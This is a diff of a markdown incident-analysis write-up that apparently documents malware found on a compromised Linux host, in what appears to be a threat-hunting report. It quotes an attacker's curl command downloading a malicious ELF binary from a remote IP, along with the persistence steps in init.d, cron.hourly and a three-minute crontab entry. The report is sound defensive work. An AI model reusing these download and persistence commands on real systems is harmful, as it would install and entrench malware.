@@ -310,25 +310,35 @@ This activity was automated and non-interactive
 
 ### Malicious Binary Download p.txt
 
-<img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />
-
-- curl http://23.160.56.194/p.txt -o ygljglkjgfg0
+- curl http://**IP ADDRESS**/p.txt -o ygljglkjgfg0
    - `p.txt` malicious ELF binary
    - `ygljglkjgfg0` renamed executable copy
+ 
+    <br>
+   
+<img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />
+
+<br> 
+
+- malicious file output to `ygljglkjgfg0`
+   - Downloaded via curl and wget from a remote host (23.160.56.194/p.txt)
+   - First seen at `/usr/bin/ygljglkjgfg0` = persistent executable
+   - Then copied to `/etc/init.d/ygljglkjgfg0` = run at boot
+   - and `/etc/cron.hourly/gcc.sh` = run every hour or as scheduled
+ 
+    <Br>
 
 <img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />
-- `ygljglkjgfg0` appears
-   - Downloaded via curl and wget from a remote host (23.160.56.194/p.txt)
-   - First seen at /usr/bin/ygljglkjgfg0 = persistent executable
-   - Then copied to /etc/init.d/ygljglkjgfg0 = run at boot
-   - and /etc/cron.hourly/gcc.sh = run every hour or as scheduled
   
 - `ygljglkjgfg0` is the original parent file to spawn the many randomized file names from the start
 - These are clones or secondary payloads:
    - Backdoors
    - Miner binaries
    - Remote control scripts
-- Randomized file names (tdrbhhtkky, omicykvmml) evade detection
+- Randomized file names (`tdrbhhtkky`, `omicykvmml`) evade detection/break continuity
+
+- **23.160.56.194 Info**
+<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />
 
 - Crontab modification
 You see a bunch of tmp.* files in /var/spool/cron/crontabs/ (like tmp.RYF9JE and tmp.SHGiEW) along with root crontab activity.
@@ -339,9 +349,6 @@ That explains the frequent FileCreated + FileRenamed events — the malware is a
 The malware edits /etc/crontab to remove old references to gcc.sh and add a new entry:
    -*/3 * * * * root /etc/cron.hourly/gcc.sh
    - malware will run every 3 minutes
-
-23.160.56.194 > p.txt download
-<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />
 
    <br>
    
